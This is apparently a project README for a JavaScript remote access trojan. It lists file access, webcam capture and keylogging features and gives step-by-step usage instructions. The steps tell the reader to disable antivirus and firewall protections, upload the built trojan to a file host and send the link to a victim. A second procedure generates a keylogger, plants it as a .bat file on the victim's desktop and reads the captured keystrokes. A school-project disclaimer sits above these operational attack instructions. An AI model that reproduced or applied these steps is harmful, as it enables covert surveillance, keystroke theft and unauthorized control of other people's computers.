
                                Mickery Mouse Remote Access Trojan
DISCLAIMER
This Trojan was created for a school project and was solely created for educational purposes. The writers of this code will not be held liable for any misuse or illegal usage of the code.

Mickey Mouse Remote Access Trojan

Created a remote access trojan using Basic JavaScript that will establish administrative control over any OS architecture it compromises. For best use running Kali Linux machine

Features

    View files from the client's machine.
    Get information about victim's machine.
    Open client's webcam and save image as screenshot.
    Monitoring user behavior through keylogger capabilities (Keystrokes).

Requirements

You NEED a 32 bit or 64 bit OS architecture to build the binaries. 

Install:
-->node
-->npm
-->Visual Studio Code

Usage
    Step 1: Clone repo
    Step 2: Open Terminal on local machine
    Step 3: Install nvm v14.15.0
    Step 4: Install npm
    Step 5: Install Visual Studio Code
    Step 6: Turn off Windows Defender and Firewall (client must also have Windows Defender off)
    Step 7: Run "npm run start" in Visual Studio Code
    Step 8: Upload the trojan file generated in the bin folder to https://gofile.io/uploadFiles
    Step 9: Copy the link and share to client
    Step 10: If client downloads and installs the contents of the link, you will now have access to their system :)

    INSTRUCTIONS TO RUN EXTERNAL KEYLOGGER:
    Step 1: Move the keylog folder to your desktop
    Step 2: Open terminal and change directory to the desktop "cd Desktop"
    Step 3: Change directory to keylogging folder "cd HatKey"  
    Step 4: run "python HatKey.py"
    Step 5: run "set host [your ip address]"
    Step 6: Run the command "run"
    Step 7: Copy the keylogger code gernerated 
    Step 8: Paste code as a ".bat" file on client's desktop
    Step 9: Open new terminal
    Step 10: repeat steps 2 and 3
    Step 11: Change directory to Ouput folder "cd Output"
    Step 12: run "cat [your ip address].machine name\ filename]"
    Step 13: Any keys typed will appear after running the above command



    

    

